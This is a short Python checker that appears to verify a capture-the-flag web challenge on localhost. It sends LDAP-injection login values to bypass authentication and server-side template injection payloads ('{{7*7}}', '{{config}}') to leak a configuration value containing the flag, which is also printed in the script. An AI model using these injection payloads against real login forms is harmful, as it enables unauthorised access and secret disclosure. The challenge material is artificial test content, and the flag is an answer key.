#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

URL = "http://localhost"

def check_basic():
      response = requests.get(URL)
      if response.status_code != 200 or not "Lightweight" in response.text:
            print("Wrong response on /")
            exit(1)


def check_bypass():
      response = requests.post(URL, data={"username": "*", "password": "*"})
      if response.status_code != 200 or not "Welcome" in response.text:
            print("Bypass failed")
            exit(1)


def check_ssti():
      response = requests.post(URL, data={"username": "*)(!(description={{7*7}}*)", "password": "*"})
      if response.status_code != 200 or not "49" in response.text:
            print("SSTI failed")
            exit(1)


def check_flag_in_config():
      response = requests.post(URL, data={"username": "*)(!(description={{config}}*)", "password": "*"})
      if response.status_code != 200 or not "ld4p_1nj3ction_plus_sst1_3quals_fl4g" in response.text:
            print("Flag leak failed")
            exit(1)


check_basic()
check_bypass()
check_ssti()
check_flag_in_config()
